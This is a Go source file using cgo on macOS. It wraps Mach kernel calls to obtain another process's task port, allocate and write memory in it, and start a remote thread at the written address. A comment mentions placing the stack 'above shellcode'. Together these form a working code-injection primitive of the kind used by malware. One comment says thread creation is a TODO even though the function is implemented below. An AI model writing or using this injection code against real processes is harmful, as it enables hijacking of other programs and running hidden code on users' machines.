//go:build darwin

package utils

/*
#cgo CFLAGS: -mmacosx-version-min=10.10
#cgo LDFLAGS: -framework CoreFoundation -framework ApplicationServices
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdlib.h>
#include <string.h>

kern_return_t my_task_for_pid(pid_t pid, mach_port_t *task) {
    return task_for_pid(mach_task_self(), pid, task);
}

// x86_64 thread state
#include <mach/thread_act.h>
#include <mach/i386/thread_status.h>

kern_return_t create_remote_thread_x86_64(mach_port_t task, mach_vm_address_t addr) {
    x86_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    state.__rip = addr;
    state.__rsp = addr + 0x8000; // arbitrary stack pointer above shellcode
    mach_port_t thread;
    kern_return_t kr = thread_create(task, &thread);
    if (kr != KERN_SUCCESS) return kr;
    kr = thread_set_state(thread, x86_THREAD_STATE64, (thread_state_t)&state, x86_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) return kr;
    kr = thread_resume(thread);
    return kr;
}
*/
import "C"
import (
	"errors"
	"unsafe"
)

func TaskForPID(pid int) (C.mach_port_t, error) {
	var task C.mach_port_t
	kr := C.my_task_for_pid(C.int(pid), &task)
	if kr != C.KERN_SUCCESS {
		return 0, errors.New("task_for_pid failed")
	}
	return task, nil
}

func MachVMAllocate(task C.mach_port_t, size int) (uintptr, error) {
	var addr C.mach_vm_address_t
	kr := C.mach_vm_allocate(task, &addr, C.mach_vm_size_t(size), C.int(1)) // VM_FLAGS_ANYWHERE
	if kr != C.KERN_SUCCESS {
		return 0, errors.New("mach_vm_allocate failed")
	}
	return uintptr(addr), nil
}

func MachVMWrite(task C.mach_port_t, addr uintptr, data []byte) error {
	kr := C.mach_vm_write(task, C.mach_vm_address_t(addr), C.vm_offset_t(uintptr(unsafe.Pointer(&data[0]))), C.mach_msg_type_number_t(len(data)))
	if kr != C.KERN_SUCCESS {
		return errors.New("mach_vm_write failed")
	}
	return nil
}

// Thread creation and state setting is more complex and architecture-specific.
// For PoC, this is left as a TODO.

// CreateRemoteThread starts a new thread at addr in the target task (x86_64 only)
func CreateRemoteThread(task C.mach_port_t, addr uintptr) error {
	kr := C.create_remote_thread_x86_64(task, C.mach_vm_address_t(addr))
	if kr != C.KERN_SUCCESS {
		return errors.New("create_remote_thread_x86_64 failed")
	}
	return nil
}
